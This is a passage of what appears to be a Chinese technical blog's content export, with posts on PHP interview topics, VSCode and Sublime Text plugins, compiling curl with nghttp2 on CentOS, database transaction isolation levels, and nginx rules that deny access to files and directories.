class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;城市不存在!&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="其他"><a href="#其他" class="headerlink" title="其他#"></a>其他<span class="exturl" data-url="aHR0cDovL2NvZmZlZXBocC5jb20vYXJ0aWNsZXMvND91dG1fc291cmNlPWxhcmF2ZWwtY2hpbmEub3JnIyVFNSU4NSVCNiVFNCVCQiU5Ng==">#<i class="fa fa-external-link-alt"></i></span></h2><h3 id="1-网页-应用访问慢突然变慢，如何定位问题"><a href="#1-网页-应用访问慢突然变慢，如何定位问题" class="headerlink" title="1.网页&#x2F;应用访问慢突然变慢，如何定位问题#"></a>1.网页&#x2F;应用访问慢突然变慢，如何定位问题<span class="exturl" data-url="aHR0cDovL2NvZmZlZXBocC5jb20vYXJ0aWNsZXMvND91dG1fc291cmNlPWxhcmF2ZWwtY2hpbmEub3JnIzElRTclQkQlOTElRTklQTElQjUlRTUlQkElOTQlRTclOTQlQTglRTglQUUlQkYlRTklOTclQUUlRTYlODUlQTIlRTclQUElODElRTclODQlQjYlRTUlOEYlOTglRTYlODUlQTIlRTUlQTYlODIlRTQlQkQlOTUlRTUlQUUlOUElRTQlQkQlOEQlRTklOTclQUUlRTklQTIlOTg=">#<i class="fa fa-external-link-alt"></i></span></h3><ol>
<li>top、iostat查看cpu、内存及io占用情况</li>
<li>内核、程序参数设置不合理 查看有没有报内核错误，连接数用户打开文件数这些有没有达到上限等等</li>
<li>链路本身慢 是否跨运营商、用户上下行带宽不够、dns解析慢、服务器内网广播风暴什么的</li>
<li>程序设计不合理 是否程序本身算法设计太差，数据库语句太过复杂或者刚上线了什么功能引起的</li>
<li>其它关联的程序引起的 如果要访问数据库，检查一下是否数据库访问慢</li>
<li>是否被攻击了 查看服务器是否被DDos了等等</li>
<li>硬件故障 这个一般直接服务器就挂了，而不是访问慢</li>
</ol>
<h3 id="2-如何设计-优化一个访问量比较大的博客-论坛"><a href="#2-如何设计-优化一个访问量比较大的博客-论坛" class="headerlink" title="2.如何设计&#x2F;优化一个访问量比较大的博客&#x2F;论坛#"></a>2.如何设计&#x2F;优化一个访问量比较大的博客&#x2F;论坛<span class="exturl" data-url="aHR0cDovL2NvZmZlZXBocC5jb20vYXJ0aWNsZXMvND91dG1fc291cmNlPWxhcmF2ZWwtY2hpbmEub3JnIzIlRTUlQTYlODIlRTQlQkQlOTUlRTglQUUlQkUlRTglQUUlQTElRTQlQkMlOTglRTUlOEMlOTYlRTQlQjglODAlRTQlQjglQUElRTglQUUlQkYlRTklOTclQUUlRTklODclOEYlRTYlQUYlOTQlRTglQkUlODMlRTUlQTQlQTclRTclOUElODQlRTUlOEQlOUElRTUlQUUlQTIlRTglQUUlQkElRTUlOUQlOUI=">#<i class="fa fa-external-link-alt"></i></span></h3><ul>
<li>减少http请求（比如使用雪碧图）</li>
<li>优化数据库（范式、SQL语句、索引、配置、读写分离）</li>
<li>缓存使用（Memcache、Redis）</li>
<li>负载均衡</li>
<li>动态内容静态化+CDN</li>
<li>禁止外部盗链（refer、图片添加水印）</li>
<li>控制大文件下载</li>
<li>使用集群</li>
</ul>
<h3 id="3-如何搭建Composer私有库"><a href="#3-如何搭建Composer私有库" class="headerlink" title="3.如何搭建Composer私有库#"></a>3.如何搭建Composer私有库<span class="exturl" data-url="aHR0cDovL2NvZmZlZXBocC5jb20vYXJ0aWNsZXMvND91dG1fc291cmNlPWxhcmF2ZWwtY2hpbmEub3JnIzMlRTUlQTYlODIlRTQlQkQlOTUlRTYlOTAlQUQlRTUlQkIlQkFDb21wb3NlciVFNyVBNyU4MSVFNiU5QyU4OSVFNSVCQSU5Mw==">#<i class="fa fa-external-link-alt"></i></span></h3><p>使用<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2NvbXBvc2VyL3NhdGlz">satis<i class="fa fa-external-link-alt"></i></span>搭建<br>相关文章介绍：<span class="exturl" data-url="aHR0cHM6Ly9qb2VsaHkuZ2l0aHViLmlvLzIwMTYvMDgvMTAvY29tcG9zZXItcHJpdmF0ZS1wYWNrYWdlcy13aXRoLXNhdGlzLw==">使用satis搭建Composer私有库<i class="fa fa-external-link-alt"></i></span></p>
]]></content>
      <categories>
        <category>Php</category>
      </categories>
  </entry>
  <entry>
    <title>VSCode 使用小结</title>
    <url>/2018/05/vscode/</url>
    <content><![CDATA[<h2 id="插件配置"><a href="#插件配置" class="headerlink" title="插件配置"></a>插件配置</h2><p>1，代码执行扩展</p>
<pre><code>Code Runner
</code></pre>
<span id="more"></span>

<p>2，查看 git 历史推送记录</p>
<pre><code>Git History
</code></pre>
<p>3，HTML，CSS 格式化工具</p>
<pre><code>HTML CSS Support
</code></pre>
<p>4，php 代码格式化工具</p>
<pre><code>php cs fixer

php-cs-fixer.executablePath 配置 php-cs-fixer-v2.phar
</code></pre>
<p>5，PHP 代码自动补全，跳转到定义</p>
<pre><code>PHP InterlliSense

terminal.integrated.shell.windows 参数配置 git 工具的执行路径
</code></pre>
<p>6，PHP 代码调试工具</p>
<pre><code>PHP Debug

① 下载扩展

② php.validate.executablePath 配置当前运行 PHP 的路径

③ php.ini 配置

zend_extension=&quot;C:\phpStudy\PHPTutorial\php\php-5.6.27-nts\ext\php_xdebug.dll&quot;
xdebug.remote_enable = 1
xdebug.remote_autostart = 1
xdebug.remote_port = 9001

④ F5 运行调试，只需要更改端口为 9001 即可
</code></pre>
]]></content>
      <categories>
        <category>DevTools</category>
      </categories>
      <tags>
        <tag>VSCode</tag>
      </tags>
  </entry>
  <entry>
    <title>让 curl 具有 http2 特性</title>
    <url>/2018/04/centos-nghttp/</url>
    <content><![CDATA[<h2 id="在-CentOS-上安装-nghttp2-最新版及让-curl-具有-http2-特性"><a href="#在-CentOS-上安装-nghttp2-最新版及让-curl-具有-http2-特性" class="headerlink" title="在 CentOS 上安装 nghttp2 最新版及让 curl 具有 http2 特性"></a>在 CentOS 上安装 nghttp2 最新版及让 curl 具有 http2 特性</h2><h2 id="nghttp2-是什么？"><a href="#nghttp2-是什么？" class="headerlink" title="nghttp2 是什么？"></a>nghttp2 是什么？</h2><p>nghttp2 是一个实现 IETF 官方 HTTP&#x2F;2 和 HPACK 头压缩算法的 C 库，但不限如此，在 C 库基础上，还实现了 http2 的客户端，服务器，代理服务器，以及压测工具。</p>
<span id="more"></span>

<p>参见官网链接</p>
<figure class="highlight avrasm"><table><tr><td class="code"><pre><span class="line"><span class="symbol">http:</span>//www.nghttp2<span class="meta">.org</span>/</span><br></pre></td></tr></table></figure>

<p>目前最新版本是 1.24.0</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">https://github.com/nghttp2/nghttp2/releases</span><br></pre></td></tr></table></figure>

<p>网上基本上都是在 Ubuntu 平台上安装 nghttp2，比如，我按照下面的链接在 <code>Ubuntu 16.04.1 LTS</code> 上顺利安装了 nghttp2</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">http</span>://www.linuxidc.com/Linux/<span class="number">2016</span>-<span class="number">01</span>/<span class="number">127588</span>.htm</span><br></pre></td></tr></table></figure>
<h2 id="安装之前的准备"><a href="#安装之前的准备" class="headerlink" title="安装之前的准备"></a>安装之前的准备</h2><p>升级 Autoconf 2.63 到 2.69</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">http:<span class="regexp">//</span>blog.csdn.net<span class="regexp">/tao_627/</span>article<span class="regexp">/details/</span><span class="number">77259591</span></span><br></pre></td></tr></table></figure>

<p>升级 GCC 4.4.7 到 4.9.2 (通过 devtoolset)</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">http:<span class="regexp">//</span>blog.csdn.net<span class="regexp">/tao_627/</span>article<span class="regexp">/details/</span><span class="number">77260963</span></span><br></pre></td></tr></table></figure>


<h2 id="安装相关依赖库"><a href="#安装相关依赖库" class="headerlink" title="安装相关依赖库"></a>安装相关依赖库</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">sudo yum -y groupinstall <span class="string">&quot;Development Tools&quot;</span></span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">sudo yum -y install openssl-devel libxml2-devel libev-devel jemalloc-devel python-devel</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">wget https://c-ares.haxx.se/download/c-ares-1.12.0.tar.gz -O /tmp/c-ares.tar.gz</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">mkdir</span> -p /tmp/c-ares</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">tar -zxvf /tmp/c-ares.tar.gz -C /tmp/c-ares --strip-components=1</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">cd</span> /tmp/c-ares &amp;&amp; ./configure --libdir=/usr/lib64</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">make</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">sudo make install</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">wget http://www.digip.org/jansson/releases/jansson-2.9.tar.gz -O /tmp/jansson.tar.gz</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">mkdir</span> -p /tmp/jansson</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">tar -zxvf /tmp/jansson.tar.gz -C /tmp/jansson --strip-components=1</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">cd</span> /tmp/jansson &amp;&amp; ./configure --libdir=/usr/lib64</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">make</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">make check</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">sudo make install</span></span><br></pre></td></tr></table></figure>

<h2 id="下面编译-nghttp2-最新版"><a href="#下面编译-nghttp2-最新版" class="headerlink" title="下面编译 nghttp2 最新版"></a>下面编译 nghttp2 最新版</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">wget https://github.com/nghttp2/nghttp2/releases/download/v1.24.0/nghttp2-1.24.0.tar.bz2</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">tar jxvf nghttp2-1.24.0.tar.bz2</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">cd</span> nghttp2-1.24.0</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">./configure</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">make</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">make install</span></span><br></pre></td></tr></table></figure>

<p>这里只是安装的库，在 <code>/usr/local/lib/libnghttp2.so</code>，头文件在 <code>/usr/local/include/nghttp2</code></p>
<h2 id="更新动态库"><a href="#更新动态库" class="headerlink" title="更新动态库"></a>更新动态库</h2><p><code>$ vim /etc/ld.so.conf</code> 添加 ‘&#x2F;usr&#x2F;local&#x2F;lib’</p>
<p>更新配置文件，执行 ldconfig</p>
<p>注意：nghttp2 本身就是一个 http2 的巨大宝库，这里我们仅是简单用到它的动态库。有兴趣的可以继续研究它的其它应用。</p>
<h2 id="下面将-nghttp2-添加进-curl-中，使-curl-带有-HTTP2-特性"><a href="#下面将-nghttp2-添加进-curl-中，使-curl-带有-HTTP2-特性" class="headerlink" title="下面将 nghttp2 添加进 curl 中，使 curl 带有 HTTP2 特性"></a>下面将 nghttp2 添加进 curl 中，使 curl 带有 HTTP2 特性</h2><p>从官网下载最新版 curl 源码</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="variable">$</span> <span class="built_in">wget</span> https://curl.haxx.se/download/<span class="built_in">curl</span><span class="literal">-7</span>.<span class="number">55.1</span>.tar.bz2</span><br><span class="line"><span class="variable">$</span> tar jxvf <span class="built_in">curl</span><span class="literal">-7</span>.<span class="number">55.1</span>.tar.bz2</span><br><span class="line"><span class="variable">$</span> <span class="built_in">cd</span> <span class="built_in">curl</span><span class="literal">-7</span>.<span class="number">55.1</span></span><br><span class="line"><span class="variable">$</span> ./configure <span class="literal">--with-nghttp2</span>=/usr/local <span class="literal">--with-ssl</span></span><br><span class="line"><span class="variable">$</span> make</span><br><span class="line"><span class="variable">$</span> make install</span><br></pre></td></tr></table></figure>

<h2 id="必要时修改环境变量"><a href="#必要时修改环境变量" class="headerlink" title="必要时修改环境变量"></a>必要时修改环境变量</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">echo</span> <span class="string">&#x27;/usr/local/lib&#x27;</span> &gt; /etc/ld.so.conf.d/local.conf</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">ldconfig</span></span><br></pre></td></tr></table></figure>

<p>更新动态库</p>
<h2 id="遇到的问题"><a href="#遇到的问题" class="headerlink" title="遇到的问题"></a>遇到的问题</h2><p>在源码编译 curl 时，执行 configure 命令遇到</p>
<figure class="highlight applescript"><table><tr><td class="code"><pre><span class="line">checking <span class="built_in">run</span>-<span class="built_in">time</span> libs availability... failed</span><br><span class="line">configure: <span class="keyword">error</span>: one <span class="keyword">or</span> more libs available <span class="keyword">at</span> link-<span class="built_in">time</span> are <span class="keyword">not</span> available <span class="built_in">run</span>-<span class="built_in">time</span>. Libs used <span class="keyword">at</span> link-<span class="built_in">time</span>: -lnghttp2   -lssl -lcrypto -lssl -lcrypto   -lz -lrt</span><br></pre></td></tr></table></figure>

<h2 id="解决方法："><a href="#解决方法：" class="headerlink" title="解决方法："></a>解决方法：</h2><p>刚才安装的动态库没有刷新到系统中，导致编译 curl 时没有找到</p>
<figure class="highlight vim"><table><tr><td class="code"><pre><span class="line">$ <span class="keyword">vim</span> /etc/ld.<span class="keyword">so</span>.<span class="keyword">conf</span></span><br></pre></td></tr></table></figure>

<p>添加 ‘&#x2F;usr&#x2F;local&#x2F;lib’</p>
<p>更新配置文件，执行 ldconfig</p>
<p>查找下面的库是否已经找到</p>
<figure class="highlight 1c"><table><tr><td class="code"><pre><span class="line">$ ldconfig -p <span class="string">| grep --color libnghttp2</span></span><br></pre></td></tr></table></figure>

<h2 id="验证"><a href="#验证" class="headerlink" title="验证"></a>验证</h2><p>查看 curl 版本时会发布特性中会增加 HTTP2 功能支持。此时 –http2 参数就可以正常使用了：</p>
<p>测试 <code>curl with http2</code></p>
<p>我们再使用如下命令测试</p>
<figure class="highlight crystal"><table><tr><td class="code"><pre><span class="line"><span class="variable">$ </span>curl --http2 -I <span class="symbol">https:</span>/<span class="regexp">/nghttp2.org/</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$ </span>curl --http2 -vo test.<span class="keyword">out</span> <span class="symbol">https:</span>/<span class="regexp">/nghttp2.org/</span></span><br></pre></td></tr></table></figure>

<p>我们可以看到详细的交互信息</p>
<h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">http:<span class="regexp">//</span>blog.csdn.net<span class="regexp">/freewebsys/</span>article<span class="regexp">/details/</span><span class="number">59112145</span></span><br><span class="line">https:<span class="regexp">//</span>wzyboy.im<span class="regexp">/post/</span><span class="number">1052</span>.html</span><br></pre></td></tr></table></figure>

<h2 id="官网-RFC"><a href="#官网-RFC" class="headerlink" title="官网 RFC"></a>官网 RFC</h2><figure class="highlight avrasm"><table><tr><td class="code"><pre><span class="line"><span class="symbol">https:</span>//tools.ietf<span class="meta">.org</span>/html/rfc7540    HTTP/<span class="number">2</span></span><br><span class="line"><span class="symbol">https:</span>//tools.ietf<span class="meta">.org</span>/html/rfc7541    HPACK</span><br><span class="line"><span class="symbol">https:</span>//tools.ietf<span class="meta">.org</span>/html/rfc7838    HTTP Alternative Services</span><br></pre></td></tr></table></figure>
<h2 id="其它参考资料-由浅入深"><a href="#其它参考资料-由浅入深" class="headerlink" title="其它参考资料 (由浅入深)"></a>其它参考资料 (由浅入深)</h2><figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">http:<span class="regexp">//</span>www.cnblogs.com<span class="regexp">/zlingh/</span>p/<span class="number">5887143</span>.html            HTTP <span class="number">2.0</span> 的那些事</span><br><span class="line">https:<span class="regexp">//</span>bagder.gitbooks.io<span class="regexp">/http2-explained/</span>zh/          http2 讲解</span><br><span class="line">High Performanc Browser Networking (Web 性能权威指南)     第 <span class="number">12</span> 章</span><br><span class="line">https:<span class="regexp">//</span>hpbn.co<span class="regexp">/http2/</span>                                  电子书最新版本</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>curl</tag>
      </tags>
  </entry>
  <entry>
    <title>数据库并发的五个问题及解决方案</title>
    <url>/2018/04/mysql-transaction/</url>
    <content><![CDATA[<h1 id="五类并发问题"><a href="#五类并发问题" class="headerlink" title="五类并发问题"></a>五类并发问题</h1><h3 id="丢失更新（第一类丢失更新）"><a href="#丢失更新（第一类丢失更新）" class="headerlink" title="丢失更新（第一类丢失更新）"></a>丢失更新（第一类丢失更新）</h3><p>撤销一个事务时，把其他事务已提交的更新数据覆盖（A 和 B 事务并发执行，A 事务执行更新后，提交；B 事务在 A 事务更新后，B 事务结束前也做了对该行数据的更新操作，然后回滚，则两次更新操作都丢失了）。这种并发问题是由于完全没有隔离事务造成的。只要设置隔离级别，数据库就能保证此类问题不发生。</p>
<span id="more"></span>

<p>客户损失 100 元。</p>
<h3 id="脏读"><a href="#脏读" class="headerlink" title="脏读"></a>脏读</h3><p>一个事务读到另一个事务未提交的更新数据（A 和 B 事务并发执行，B 事务执行更新后，A 事务查询 B 事务没有提交的数据，B 事务回滚，则 A 事务得到的数据不是数据库中的真实数据。也就是脏数据，即和数据库中不一致的数据）。</p>
<p>客户损失 100 元。</p>
<h3 id="不可重复读"><a href="#不可重复读" class="headerlink" title="不可重复读"></a>不可重复读</h3><p>一个事务读到另一个事务已提交的更新数据（A 和 B 事务并发执行，A 事务查询数据，然后 B 事务更新该数据，A 再次查询该数据时，发现该数据变化了）。</p>
<h3 id="覆盖更新（第二类丢失更新）"><a href="#覆盖更新（第二类丢失更新）" class="headerlink" title="覆盖更新（第二类丢失更新）"></a>覆盖更新（第二类丢失更新）</h3><p>这是不可重复读中的特例，一个事务覆盖另一个事务已提交的更新数据（即 A 事务更新数据，然后 B 事务更新该数据，A 事务查询发现自己更新的数据变了）。</p>
<p>银行损失 100 元。</p>
<h3 id="虚读（幻读）"><a href="#虚读（幻读）" class="headerlink" title="虚读（幻读）"></a>虚读（幻读）</h3><p>一个事务读到另一个事务已提交的新插入的数据（A 和 B 事务并发执行，A 事务查询数据，B 事务插入或者删除数据，A 事务再次查询发现结果集中有以前没有的数据或者以前有的数据消失了）。</p>
<h1 id="四级封锁协议"><a href="#四级封锁协议" class="headerlink" title="四级封锁协议"></a>四级封锁协议</h1><h3 id="共享锁和排它锁"><a href="#共享锁和排它锁" class="headerlink" title="共享锁和排它锁"></a>共享锁和排它锁</h3><p>为了解决并发问题，数据库系统引入锁机制。</p>
<p>基本的封锁类型有两种: 排它锁 (Exclusive locks 简记为 X 锁) 和 共享锁 (Share locks 简记为 S 锁)。</p>
<p>排它锁又称为写锁。若事务 T 对数据对象 A 加上 X 锁，则只允许 T 读取和修改 A，其它任何事务都不能再对 A 加任何类型的锁，直到 T 释放 A 上的锁。这就保证了其它事务在 T 释放 A 上的锁之前不能再读取和修改 A。</p>
<p>共享锁又称为读锁。若事务 T 对数据对象 A 加上 S 锁，则事务 T 可以读 A 但不能修改 A，其它事务只能再对 A 加 S 锁，而不能加 X 锁，直到 T 释放 A 上的 S 锁。这就保证了其它事务可以读 A，但在 T 释放 A 上的 S 锁之前不能对 A 做任何修改。</p>
<h3 id="封锁粒度"><a href="#封锁粒度" class="headerlink" title="封锁粒度"></a>封锁粒度</h3><p>数据库中为了实现并发控制而采用封锁技术。</p>
<p>封锁对象的大小称为封锁粒度（Granularity）。</p>
<p>封锁的对象可以是逻辑单元，也可以是物理单元。以关系数据库为例子，封锁对象可以是这样一些逻辑单元：属性值、属性值的集合、元组、关系、索引项、整个索引项直至整个数据库；也可以是这样的一些物理单元：页（数据页或索引页）、物理记录等。</p>
<h3 id="封锁协议与隔离级别"><a href="#封锁协议与隔离级别" class="headerlink" title="封锁协议与隔离级别"></a>封锁协议与隔离级别</h3><p>在运用 排他锁 和 共享锁 对数据对象加锁时，还需要约定一些规则，例如何时申请 排他锁 或 共享锁、持锁时间、何时释放等。称这些规则为封锁协议（Locking Protocol）。对封锁方式规定不同的规则，就形成了各种不同的封锁协议。不同的封锁协议对应不同的隔离级别。</p>
<h1 id="事务隔离的四个级别"><a href="#事务隔离的四个级别" class="headerlink" title="事务隔离的四个级别"></a>事务隔离的四个级别</h1><h3 id="一级封锁协议（对应-read-uncommited）"><a href="#一级封锁协议（对应-read-uncommited）" class="headerlink" title="一级封锁协议（对应 read uncommited）"></a>一级封锁协议（对应 read uncommited）</h3><p>一级封锁协议是：事务 T 在修改数据 R 之前必须先对其加 X 锁，直到事务结束才释放。事务结束包括正常结束（COMMIT）和非正常结束（ROLLBACK）。 </p>
<p>一级封锁协议可防止丢失更新，并保证事务 T 是可恢复的。 </p>
<p>在一级封锁协议中，如果仅仅是读数据不对其进行修改，是不需要加锁的，所以它不能保证可重复读和不读 “脏” 数据。</p>
<h3 id="二级封锁协议（对应-read-commited）"><a href="#二级封锁协议（对应-read-commited）" class="headerlink" title="二级封锁协议（对应 read commited）"></a>二级封锁协议（对应 read commited）</h3><p>二级封锁协议是：一级封锁协议加上事务 T 在读取数据 R 之前必须先对其加 S 锁，读完后即可释放 S 锁（瞬间 S 锁）。</p>
<p>二级封锁协议除防止了丢失更新，还可进一步防止读 “脏” 数据。</p>
<h3 id="三级封锁协议（对应-reapetable-read）"><a href="#三级封锁协议（对应-reapetable-read）" class="headerlink" title="三级封锁协议（对应 reapetable read）"></a>三级封锁协议（对应 reapetable read）</h3><p>三级封锁协议是：一级封锁协议加上事务 T 在读取数据 R 之前必须先对其加 S 锁，直到事务结束才释放。</p>
<p>三级封锁协议除防止了丢失更新和不读‘脏’数据外，还进一步防止了不可重复读和覆盖更新。</p>
<h3 id="四级封锁协议（对应-serialization）"><a href="#四级封锁协议（对应-serialization）" class="headerlink" title="四级封锁协议（对应 serialization）"></a>四级封锁协议（对应 serialization）</h3><p>四级封锁协议是对三级封锁协议的增强，其实现机制也最为简单，直接对 事务中 所 读取 或者 更改的数据所在的表加表锁，也就是说，其他事务不能 读写 该表中的任何数据。这样五类并发问题都得以避免！</p>
<p>注：封锁协议和隔离级别并不是严格对应的。</p>
<h3 id="各种隔离级别所能避免的并发问题"><a href="#各种隔离级别所能避免的并发问题" class="headerlink" title="各种隔离级别所能避免的并发问题"></a>各种隔离级别所能避免的并发问题</h3><p>隔离级别越高，越能保证数据的完整性和一致性，但是对并发性能的影响也越大。对于多数应用程序，可以优先考虑把数据库系统的隔离级别设为 Read Committed。它能够避免脏读取，而且具有较好的并发性能。尽管它会导致不可重复读、幻读和第二类丢失更新这些并发问题，在可能出现这类问题的个别场合，可以由应用程序采用悲观锁或乐观锁来控制。</p>
]]></content>
      <categories>
        <category>MySQL</category>
      </categories>
  </entry>
  <entry>
    <title>Nginx 服务器中设置禁止访问文件或目录的方法</title>
    <url>/2018/04/nginx-deny/</url>
    <content><![CDATA[<h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>在 nginx 要禁止某个或一类资源，只需要增加一个 location，然后在其中使用 deny all 即可。</p>
<p>禁止访问扩展名为 bat 的文件，配置如下</p>
<span id="more"></span>

<figure class="highlight crmsh"><table><tr><td class="code"><pre><span class="line"><span class="keyword">location</span> <span class="title">~* /.bat</span> &#123;</span><br><span class="line">  <span class="keyword">deny</span> all;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>禁止访问 configs 目录，以及其下所有子目录或文件，配置如下</p>
<figure class="highlight crmsh"><table><tr><td class="code"><pre><span class="line"><span class="keyword">location</span> <span class="title">^~ /configs</span>/ &#123;</span><br><span class="line">  <span class="keyword">deny</span> all;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>注意上述 configs 后面的斜杠不能少，否则所有以 configs 开头的目录或文件都将禁止访问。</p>
]]></content>
      <categories>
        <category>Nginx</category>
      </categories>
  </entry>
  <entry>
    <title>8 款实用 Sublime Text 3 插件推荐</title>
    <url>/2018/04/sublime-text/</url>
    <content><![CDATA[<h2 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h2><p>Sublime Text 作为一个尽为人知的代码编辑器，其优点不用赘述。界面整洁美观、文本功能强大，且运行速度极快，非常适合编写代码，写文章做笔记。</p>
<p>Sublime Text 还支持 Mac、Windows 和 Linux 各大平台，方便用户使用。种类繁多、功能强大的插件更给 Sublime Text 3 锦上添花。</p>
<span id="more"></span>

<p>下载 Package Control 后就可以迅速的开启插件之路。</p>
<h2 id="1-Soda-Theme"><a href="#1-Soda-Theme" class="headerlink" title="1. Soda Theme"></a>1. Soda Theme</h2><p>Sublime Text 3 中较为常用的一款自定义编辑器主题，用过的人都说好。Soda Theme 包含代码着色、标签、图标，拥有 light 和 dark 两种颜色主题便于用户在不同时间段使用。</p>
<p>地址：<span class="exturl" data-url="aHR0cHM6Ly9wYWNrYWdlY29udHJvbC5pby9wYWNrYWdlcy9UaGVtZSUyMC0lMjBTb2Rh">https://packagecontrol.io/packages/Theme%20-%20Soda<i class="fa fa-external-link-alt"></i></span></p>
<h2 id="2-Sublime-APICloud-Plugins"><a href="#2-Sublime-APICloud-Plugins" class="headerlink" title="2. Sublime APICloud Plugins"></a>2. Sublime APICloud Plugins</h2><p>Sublime APICloud Plugins 是 APICloud 为开发者提供的一套开源的 Sublime Text 扩展插件，包括：应用管理、应用框架、页面模板、代码提示、代码管理、Widget 打包、真机同步、日志输出、管理自定义 AppLoader 等功能，其他的功能插件也在不断增加，这些插件已被 Package Control 成功收录，开发者可以直接在 Sublime Text3 中下载安装；所有插件都已开源，开发者也可以在此基础上按需求扩展自己的插件。</p>
<p>地址：<span class="exturl" data-url="aHR0cDovL3d3dy5hcGljbG91ZC5jb20vZGV2dG9vbHM=">http://www.apicloud.com/devtools<i class="fa fa-external-link-alt"></i></span></p>
<h2 id="3-ColorPicker"><a href="#3-ColorPicker" class="headerlink" title="3. ColorPicker"></a>3. ColorPicker</h2><p>编辑 CSS 样式的时候， ColorPicker 调色盘不仅可以查看颜色值，更可以轻松调好颜色。ColorPicker 同时还是一个双向选择颜色的功能，既可以在调色板中选好颜色将其使用至文档中，也可以迅速定位文档中的某一种颜色值到调色板中。</p>
<p>地址：<span class="exturl" data-url="aHR0cDovL3d3dy5jb2xvcnBpY2tlci5jb20v">http://www.colorpicker.com/<i class="fa fa-external-link-alt"></i></span></p>
<h2 id="4-Emmet"><a href="#4-Emmet" class="headerlink" title="4. Emmet"></a>4. Emmet</h2><p>Emmet （前身是 Zen Coding）是一个前端开发不可缺少的插件，它让编写 HTML 和 CSS 代码变得简单，节省大量时间。Emmet 可使开发者用缩写形式书写代码，再用 “扩展” 功能自动将代码扩展至完整样式。</p>
<p>早在 2009 年，Zen Coding 作为具有革命性的 HTML 和 CSS 代码编辑插件一经问世，直到现在帮助了无数的开发者，减少他们的时间，使得编写代码变得简便有趣。现在，Emmet 已经超越了 Zen Coding 到达了更高层次，普适性的功能将给更多的开发者带来便利。</p>
<p>地址：<span class="exturl" data-url="aHR0cDovL3d3dy5lbW1ldC5pby8=">http://www.emmet.io/<i class="fa fa-external-link-alt"></i></span></p>
<h2 id="5-SublimeCodeIntel"><a href="#5-SublimeCodeIntel" class="headerlink" title="5. SublimeCodeIntel"></a>5. SublimeCodeIntel</h2><p>SublimeCodeIntel 作为一个代码提示和补全插件，支持 javascript、Mason、XBL、XUL、RHTML、SCSS、Python、HTML、Ruby、Python3、xml、Sass、XSLT、Django、HTML5、Perl、CSS、Twig、Less、Smarty、Node.js、Tcl、TemplateToolkit 和 PHP 等所有语言，是 Sublime Text 自带代码提示功能基础上一个更好的扩展，自带代码提示功能只可提示系统代码，而 SublimeCodeIntel 则可以提示用户自定义代码。SublimeCodeIntel 支持跳转到变量、函数定义的功能，另外还有自动补全的功能，十分方便。</p>
<p>地址：<span class="exturl" data-url="aHR0cHM6Ly9wYWNrYWdlY29udHJvbC5pby9wYWNrYWdlcy9TdWJsaW1lQ29kZUludGVs">https://packagecontrol.io/packages/SublimeCodeIntel<i class="fa fa-external-link-alt"></i></span></p>
<h2 id="6-FileDiffs"><a href="#6-FileDiffs" class="headerlink" title="6. FileDiffs"></a>6. FileDiffs</h2><p>FileDiffs 插件可以让开发者比较两个不同文件的差异，比较的对象包括当前文件、另一文件、剪切板中的代码甚至未保存文件等。</p>
<p>地址：<span class="exturl" data-url="aHR0cHM6Ly9wYWNrYWdlY29udHJvbC5pby9wYWNrYWdlcy9GaWxlRGlmZnM=">https://packagecontrol.io/packages/FileDiffs<i class="fa fa-external-link-alt"></i></span></p>
